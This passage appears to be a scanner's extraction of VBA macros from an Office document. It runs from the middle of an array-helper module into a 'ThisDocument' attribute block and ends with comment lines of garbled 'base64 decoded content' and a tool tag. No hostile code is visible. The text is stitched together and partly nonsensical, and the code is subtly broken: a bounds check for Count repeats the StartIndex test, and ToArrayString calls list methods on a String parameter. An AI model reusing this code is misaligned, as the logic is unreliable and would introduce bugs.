    Lb = ArrayH.GetLowerBound(Arr, 0)
    
    If (StartIndex < Lb) Or (StartIndex > ArrayH.Length(Arr) + Lb) Then
        Exception.ArgumentOutOfRangeException "StartIndex", ModuleName & "." & MethodName
    End If
    
    If (StartIndex < Lb) Or (StartIndex > ArrayH.Length(Arr) + Lb) Then
        Exception.ArgumentOutOfRangeException "Count", ModuleName & "." & MethodName
    End If
    
    Dim ObjArray() As Variant
    ObjArray = Arr
    
    Dim EndIndex As Long
    EndIndex = StartIndex + Count
    
    Dim IsEmptyOrNothing As Boolean
    
    If IsEmpty(Value) Then
        IsEmptyOrNothing = True
    ElseIf IsObject(Value) Then
        IsEmptyOrNothing = (Value Is Nothing)
    End If
    
    Dim i As Long
    
    If IsEmptyOrNothing Then
        
        For i = StartIndex To EndIndex - 1
            If IsEmpty(ObjArray(i)) Or (ObjArray(i) Is Nothing) Then
                IndexOf = i
                Exit Function
            End If
        Next i
    Else
    
        For i = StartIndex To EndIndex - 1
            Dim Item As Variant: Item = ObjArray(i)
            If IsEmpty(Item) = False And (Item = Value) Then
                IndexOf = i
                Exit Function
            End If
        Next i
    End If
    
End Function


Public Sub SetValue(ByRef Arr() As Variant, ByRef Value As Variant, ByVal Index As Long)
    
    If Rank(Arr) <> 1 Then
        Exception.ArgumentException "Arr", "Multi dimensions array are not supported. " & ModuleName & ".SetValue"
    End If
    
    If IsObject(Value) Then
        Set Arr(Index) = Value
    Else
        Arr(Index) = Value
    End If
    
End Sub


Public Function ToArrayString(ByRef List As String) As Variant()
    
    Dim Output() As Variant
    ReDim Output(0 To List.Count - 1)

    Dim i As Long
    For i = 0 To List.Count - 1
        Output(i) = List.GetItem(i)
    Next i

    ToArrayString = Output
    
End Function


' Converts any array to the Variant Array. When input array is not initalized
' method returns not initialized Variant Array.
' Throws ArgumentException when Arr is not an array.
Public Function ToVariantArray(ByRef Arr As Variant) As Variant()

    Const MethodName = "ToVariantArray"
    
    If VBA.IsArray(Arr) = False Then
        Exception.ArgumentException "Arr", ModuleName & "." & MethodName
    End If

    ' Here, we still can't use defined methods like IsInitalized because
    ' Arr is still a Variant type, as oposed to the Array of Variant elements.
    ' We have to check manually if Array is initiliazed.
    
    '@Ignore AssignmentNotUsed
    Dim Low As Long: Low = -1
    '@Ignore AssignmentNotUsed
    Dim High As Long: High = -1
    
    On Error Resume Next
    Low = LBound(Arr)
    High = UBound(Arr)
    On Error GoTo 0 ' Cancel "Ignore erorrs"
    
    ' At this point we know, that Arr is an array, but it is not initialized.
    ' Return not initalized array back.
    If Low = -1 Or High = -1 Then
        Dim NotInit() As Variant
        ToVariantArray = NotInit
        Exit Function
    End If

    Dim Output() As Variant
    ReDim Output(Low To High)
    
    Dim Ndx As Long
    For Ndx = Low To High
        Output(Ndx) = Arr(Ndx)
    Next Ndx
    
    ToVariantArray = Output

End Function


' Returns an Array of String values. This helper method enables to
' create inline array.
Public Function StringArray(ParamArray Items() As Variant) As String()
    
    Dim UpperLimit As Long
    UpperLimit = UBound(Items)
    
    Dim Output() As String
    ReDim Output(0 To UpperLimit)
    
    Dim i As Long
    For i = 0 To UpperLimit
        Output(i) = Items(i)
    Next i
    
    StringArray = Output
    
End Function







Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

' InQuest injected base64 decoded content
' @S<8
' A?JA
' I5&%5*
' 9P_=AL
' H'$.89
' ?JI*GV
' R13("/",
' =ASE%
' R/CG
' _&6,34GME
' MER 

INQUEST-PP=macro
